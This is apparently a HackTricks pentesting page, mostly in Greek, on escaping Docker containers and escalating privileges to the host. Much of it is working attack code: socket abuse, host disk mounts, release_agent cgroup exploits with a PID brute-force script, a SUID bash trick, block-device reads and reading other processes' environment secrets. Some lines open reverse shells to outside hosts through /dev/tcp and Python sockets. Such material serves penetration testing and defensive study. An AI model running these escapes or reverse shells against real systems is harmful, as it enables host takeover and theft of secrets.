# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Αυτόματη Αρίθμηση & Διαφυγή

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Μπορεί επίσης να **αριθμήσει τα κοντέινερ**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Αυτό το εργαλείο είναι αρκετά **χρήσιμο για να αριθμήσει το κοντέινερ στο οποίο βρίσκεστε και να προσπαθήσει να διαφύγει αυτόματα**
- [**amicontained**](https://github.com/genuinetools/amicontained): Χρήσιμο εργαλείο για να αποκτήσετε τα δικαιώματα που έχει το κοντέινερ προκειμένου να βρείτε τρόπους να διαφύγετε από αυτό
- [**deepce**](https://github.com/stealthcopter/deepce): Εργαλείο για να αριθμήσει και να διαφύγει από κοντέινερ
- [**grype**](https://github.com/anchore/grype): Λάβετε τα CVEs που περιέχονται στο λογισμικό που είναι εγκατεστημένο στην εικόνα

## Διαφυγή από το Εγκατεστημένο Docker Socket

Αν με κάποιο τρόπο διαπιστώσετε ότι το **docker socket είναι εγκατεστημένο** μέσα στο κοντέινερ docker, θα μπορείτε να διαφύγετε από αυτό.\
Αυτό συμβαίνει συνήθως σε κοντέινερ docker που για κάποιο λόγο χρειάζονται να συνδεθούν με το docker daemon για να εκτελέσουν ενέργειες.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Σε αυτή την περίπτωση μπορείτε να χρησιμοποιήσετε κανονικές εντολές docker για να επικοινωνήσετε με τον docker daemon:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> Σε περίπτωση που το **docker socket είναι σε απροσδόκητη τοποθεσία**, μπορείτε να επικοινωνήσετε μαζί του χρησιμοποιώντας την εντολή **`docker`** με την παράμετρο **`-H unix:///path/to/docker.sock`**

Ο Docker daemon μπορεί επίσης να [ακούει σε μια θύρα (κατά προεπιλογή 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ή σε συστήματα βασισμένα σε Systemd, η επικοινωνία με τον Docker daemon μπορεί να γίνει μέσω του socket του Systemd `fd://`.

> [!NOTE]
> Επιπλέον, δώστε προσοχή στα runtime sockets άλλων υψηλού επιπέδου runtimes:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Κατάχρηση Δικαιωμάτων Διαφυγής

Πρέπει να ελέγξετε τα δικαιώματα του κοντέινερ, αν έχει οποιοδήποτε από τα παρακάτω, μπορεί να είστε σε θέση να διαφύγετε από αυτό: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Μπορείτε να ελέγξετε τα τρέχοντα δικαιώματα του κοντέινερ χρησιμοποιώντας **τα προηγουμένως αναφερόμενα αυτόματα εργαλεία** ή:
```bash
capsh --print
```
Στην παρακάτω σελίδα μπορείτε να **μάθετε περισσότερα για τις δυνατότητες του linux** και πώς να τις εκμεταλλευτείτε για να ξεφύγετε/ανεβάσετε δικαιώματα:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Διαφυγή από Προνομιακά Κοντέινερ

Ένα προνομιακό κοντέινερ μπορεί να δημιουργηθεί με τη σημαία `--privileged` ή απενεργοποιώντας συγκεκριμένες άμυνες:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

Η σημαία `--privileged` μειώνει σημαντικά την ασφάλεια του κοντέινερ, προσφέροντας **απεριόριστη πρόσβαση σε συσκευές** και παρακάμπτοντας **πολλές προστασίες**. Για λεπτομερή ανάλυση, ανατρέξτε στην τεκμηρίωση σχετικά με τις πλήρεις επιπτώσεις της `--privileged`.

{{#ref}}
../docker-privileged.md
{{#endref}}

### Προνομιακό + hostPID

Με αυτές τις άδειες μπορείτε απλά να **μετακινηθείτε στο namespace μιας διαδικασίας που εκτελείται στον host ως root** όπως το init (pid:1) απλά εκτελώντας: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Δοκιμάστε το σε ένα κοντέινερ εκτελώντας:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privileged

Μόνο με την σημαία privileged μπορείτε να προσπαθήσετε να **πρόσβαση στον δίσκο του host** ή να προσπαθήσετε να **ξεφύγετε εκμεταλλευόμενοι το release_agent ή άλλες διαφυγές**.

Δοκιμάστε τους παρακάτω παρακάμψεις σε ένα κοντέινερ εκτελώντας:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Mounting Disk - Poc1

Καλά ρυθμισμένα docker containers δεν θα επιτρέψουν εντολές όπως **fdisk -l**. Ωστόσο, σε κακώς ρυθμισμένη docker εντολή όπου η σημαία `--privileged` ή `--device=/dev/sda1` με κεφαλαία έχει καθοριστεί, είναι δυνατόν να αποκτηθούν τα δικαιώματα για να δει κανείς τον δίσκο του host.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Έτσι, για να αναλάβετε τη μηχανή host, είναι απλό:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
Και voilà! Τώρα μπορείτε να έχετε πρόσβαση στο σύστημα αρχείων του host γιατί είναι τοποθετημένο στον φάκελο `/mnt/hola`.

#### Τοποθέτηση Δίσκου - Poc2

Μέσα στο κοντέινερ, ένας επιτιθέμενος μπορεί να προσπαθήσει να αποκτήσει περαιτέρω πρόσβαση στο υποκείμενο λειτουργικό σύστημα του host μέσω ενός εγγράψιμου hostPath volume που έχει δημιουργηθεί από το cluster. Παρακάτω είναι μερικά κοινά πράγματα που μπορείτε να ελέγξετε μέσα στο κοντέινερ για να δείτε αν μπορείτε να εκμεταλλευτείτε αυτό το vector επιθέσεων:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Privileged Escape Κατάχρηση υπάρχοντος release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Privileged Escape Abusing created release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
Βρείτε μια **εξήγηση της τεχνικής** στο:

{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Privileged Escape Abusing release_agent χωρίς να γνωρίζετε τη σχετική διαδρομή - PoC3

Στα προηγούμενα exploits, η **απόλυτη διαδρομή του κοντέινερ μέσα στο σύστημα αρχείων του host αποκαλύπτεται**. Ωστόσο, αυτό δεν ισχύει πάντα. Σε περιπτώσεις όπου **δεν γνωρίζετε την απόλυτη διαδρομή του κοντέινερ μέσα στον host**, μπορείτε να χρησιμοποιήσετε αυτή την τεχνική:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Η εκτέλεση του PoC μέσα σε ένα προνομιούχο κοντέινερ θα πρέπει να παρέχει έξοδο παρόμοια με:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Εκμετάλλευση Προνομιακής Διαφυγής μέσω Ευαίσθητων Μοντάρων

Υπάρχουν αρκετά αρχεία που μπορεί να είναι μονταρισμένα και να δίνουν **πληροφορίες για τον υποκείμενο host**. Ορισμένα από αυτά μπορεί ακόμη να υποδεικνύουν **κάτι που θα εκτελείται από τον host όταν συμβεί κάτι** (το οποίο θα επιτρέψει σε έναν επιτιθέμενο να διαφύγει από το κοντέινερ).\
Η εκμετάλλευση αυτών των αρχείων μπορεί να επιτρέψει:

- release_agent (έχει καλυφθεί ήδη)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Ωστόσο, μπορείτε να βρείτε **άλλα ευαίσθητα αρχεία** για να ελέγξετε σε αυτή τη σελίδα:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### Αυθαίρετα Μοντάρισμα

Σε πολλές περιπτώσεις θα διαπιστώσετε ότι το **κοντέινερ έχει κάποιον όγκο μονταρισμένο από τον host**. Εάν αυτός ο όγκος δεν έχει ρυθμιστεί σωστά, μπορεί να είστε σε θέση να **πρόσβαση/τροποποιήσετε ευαίσθητα δεδομένα**: Διαβάστε μυστικά, αλλάξτε ssh authorized_keys…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Privilege Escalation with 2 shells and host mount

Αν έχετε πρόσβαση ως **root μέσα σε ένα κοντέινερ** που έχει κάποιον φάκελο από τον host τοποθετημένο και έχετε **διαφύγει ως μη προνομιούχος χρήστης στον host** και έχετε δικαιώματα ανάγνωσης πάνω από τον τοποθετημένο φάκελο.\
Μπορείτε να δημιουργήσετε ένα **bash suid αρχείο** στον **τοποθετημένο φάκελο** μέσα στο **κοντέινερ** και να **το εκτελέσετε από τον host** για privesc.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Privilege Escalation with 2 shells

Αν έχετε πρόσβαση ως **root μέσα σε ένα container** και έχετε **διαφύγει ως μη προνομιούχος χρήστης στον host**, μπορείτε να εκμεταλλευτείτε και τα δύο shells για **privesc μέσα στον host** αν έχετε την ικανότητα MKNOD μέσα στο container (είναι από προεπιλογή) όπως [**εξηγείται σε αυτή την ανάρτηση**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Με αυτή την ικανότητα, ο χρήστης root μέσα στο container επιτρέπεται να **δημιουργεί αρχεία συσκευών μπλοκ**. Τα αρχεία συσκευών είναι ειδικά αρχεία που χρησιμοποιούνται για **πρόσβαση σε υποκείμενο υλικό & kernel modules**. Για παράδειγμα, το αρχείο συσκευής μπλοκ /dev/sda δίνει πρόσβαση για **ανάγνωση των ακατέργαστων δεδομένων στον δίσκο του συστήματος**.

Το Docker προστατεύει από την κακή χρήση των αρχείων συσκευών μπλοκ μέσα σε containers επιβάλλοντας μια πολιτική cgroup που **μπλοκάρει τις λειτουργίες ανάγνωσης/εγγραφής αρχείων συσκευών μπλοκ**. Παρ' όλα αυτά, αν ένα αρχείο συσκευής μπλοκ **δημιουργηθεί μέσα στο container**, γίνεται προσβάσιμο από έξω από το container μέσω του **/proc/PID/root/** καταλόγου. Αυτή η πρόσβαση απαιτεί ο **ιδιοκτήτης της διαδικασίας να είναι ο ίδιος** τόσο μέσα όσο και έξω από το container.

**Exploitation** παράδειγμα από αυτή την [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Αν μπορείτε να έχετε πρόσβαση στις διεργασίες του host, θα μπορείτε να αποκτήσετε πρόσβαση σε πολλές ευαίσθητες πληροφορίες που είναι αποθηκευμένες σε αυτές τις διεργασίες. Εκτελέστε το test lab:
```
docker run --rm -it --pid=host ubuntu bash
```
Για παράδειγμα, θα μπορείτε να καταγράψετε τις διεργασίες χρησιμοποιώντας κάτι όπως `ps auxn` και να αναζητήσετε ευαίσθητες λεπτομέρειες στις εντολές.

Στη συνέχεια, καθώς μπορείτε **να έχετε πρόσβαση σε κάθε διεργασία του host στο /proc/ μπορείτε απλά να κλέψετε τα env secrets τους** εκτελώντας:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Μπορείτε επίσης να **έχετε πρόσβαση στους περιγραφείς αρχείων άλλων διεργασιών και να διαβάσετε τα ανοιχτά τους αρχεία**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Μπορείτε επίσης να **τερματίσετε διεργασίες και να προκαλέσετε DoS**.

> [!WARNING]
> Εάν έχετε κάπως προνομιακή **πρόσβαση σε μια διεργασία εκτός του κοντέινερ**, θα μπορούσατε να εκτελέσετε κάτι όπως `nsenter --target <pid> --all` ή `nsenter --target <pid> --mount --net --pid --cgroup` για να **εκτελέσετε ένα shell με τους ίδιους περιορισμούς ns** (ελπίζουμε κανέναν) **όπως αυτή η διεργασία.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Αν ένα κοντέινερ έχει ρυθμιστεί με τον Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), το δίκτυο του κοντέινερ δεν είναι απομονωμένο από τον Docker host (το κοντέινερ μοιράζεται το namespace δικτύου του host) και το κοντέινερ δεν αποκτά τη δική του διεύθυνση IP. Με άλλα λόγια, το **κοντέινερ δένει όλες τις υπηρεσίες απευθείας στη διεύθυνση IP του host**. Επιπλέον, το κοντέινερ μπορεί να **παρακολουθεί ΟΛΗ την κυκλοφορία δικτύου που στέλνει και λαμβάνει ο host** στην κοινή διεπαφή `tcpdump -i eth0`.

Για παράδειγμα, μπορείτε να το χρησιμοποιήσετε για να **παρακολουθήσετε και ακόμη και να παραποιήσετε την κυκλοφορία** μεταξύ του host και της μεταδεδομένης παρουσίας.

Όπως στα παρακάτω παραδείγματα:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

Θα μπορείτε επίσης να έχετε πρόσβαση σε **υπηρεσίες δικτύου που είναι δεμένες με το localhost** μέσα στον host ή ακόμη και να έχετε πρόσβαση στις **άδειες μεταδεδομένων του κόμβου** (οι οποίες μπορεί να είναι διαφορετικές από αυτές που μπορεί να έχει πρόσβαση ένα κοντέινερ).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Με το `hostIPC=true`, αποκτάτε πρόσβαση στους πόρους επικοινωνίας διεργασιών (IPC) του κεντρικού υπολογιστή, όπως η **κοινή μνήμη** στο `/dev/shm`. Αυτό επιτρέπει την ανάγνωση/εγγραφή όπου οι ίδιοι πόροι IPC χρησιμοποιούνται από άλλες διεργασίες του κεντρικού υπολογιστή ή του pod. Χρησιμοποιήστε το `ipcs` για να εξετάσετε περαιτέρω αυτούς τους μηχανισμούς IPC.

- **Εξετάστε το /dev/shm** - Αναζητήστε οποιαδήποτε αρχεία σε αυτήν την τοποθεσία κοινής μνήμης: `ls -la /dev/shm`
- **Εξετάστε τις υπάρχουσες εγκαταστάσεις IPC** – Μπορείτε να ελέγξετε αν χρησιμοποιούνται κάποιες εγκαταστάσεις IPC με το `/usr/bin/ipcs`. Ελέγξτε το με: `ipcs -a`

### Ανάκτηση ικανοτήτων

Εάν η syscall **`unshare`** δεν απαγορεύεται, μπορείτε να ανακτήσετε όλες τις ικανότητες εκτελώντας:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Κατάχρηση του user namespace μέσω symlink

Η δεύτερη τεχνική που εξηγείται στην ανάρτηση [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) υποδεικνύει πώς μπορείτε να καταχραστείτε τις bind mounts με user namespaces, για να επηρεάσετε αρχεία μέσα στον host (σε αυτή την συγκεκριμένη περίπτωση, να διαγράψετε αρχεία).

## CVEs

### Runc exploit (CVE-2019-5736)

Σε περίπτωση που μπορείτε να εκτελέσετε `docker exec` ως root (πιθανώς με sudo), προσπαθείτε να κλιμακώσετε τα δικαιώματα σας διαφεύγοντας από ένα container καταχρώντας το CVE-2019-5736 (exploit [εδώ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Αυτή η τεχνική θα **επικαλύψει** το _**/bin/sh**_ δυαδικό αρχείο του **host** **από ένα container**, έτσι ώστε οποιοσδήποτε εκτελεί docker exec να μπορεί να ενεργοποιήσει το payload.

Αλλάξτε το payload αναλόγως και κατασκευάστε το main.go με `go build main.go`. Το προκύπτον δυαδικό αρχείο θα πρέπει να τοποθετηθεί στο docker container για εκτέλεση.\
Κατά την εκτέλεση, μόλις εμφανιστεί το `[+] Overwritten /bin/sh successfully` πρέπει να εκτελέσετε το εξής από τη μηχανή host:

`docker exec -it <container-name> /bin/sh`

Αυτό θα ενεργοποιήσει το payload που είναι παρόν στο αρχείο main.go.

Για περισσότερες πληροφορίες: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> Υπάρχουν άλλες CVEs στις οποίες το container μπορεί να είναι ευάλωτο, μπορείτε να βρείτε μια λίστα στο [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)

## Docker Custom Escape

### Επιφάνεια Διαφυγής Docker

- **Namespaces:** Η διαδικασία θα πρέπει να είναι **εντελώς απομονωμένη από άλλες διαδικασίες** μέσω namespaces, έτσι ώστε να μην μπορούμε να διαφύγουμε αλληλεπιδρώντας με άλλες διαδικασίες λόγω namespaces (κατά προεπιλογή δεν μπορούν να επικοινωνούν μέσω IPCs, unix sockets, δικτυακών υπηρεσιών, D-Bus, `/proc` άλλων διαδικασιών).
- **Χρήστης root**: Κατά προεπιλογή, ο χρήστης που εκτελεί τη διαδικασία είναι ο χρήστης root (ωστόσο τα δικαιώματά του είναι περιορισμένα).
- **Δυνατότητες**: Το Docker αφήνει τις εξής δυνατότητες: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Syscalls**: Αυτές είναι οι syscalls που ο **χρήστης root δεν θα μπορεί να καλέσει** (λόγω έλλειψης δυνατοτήτων + Seccomp). Οι άλλες syscalls θα μπορούσαν να χρησιμοποιηθούν για να προσπαθήσουν να διαφύγουν.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="arm64 syscalls"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
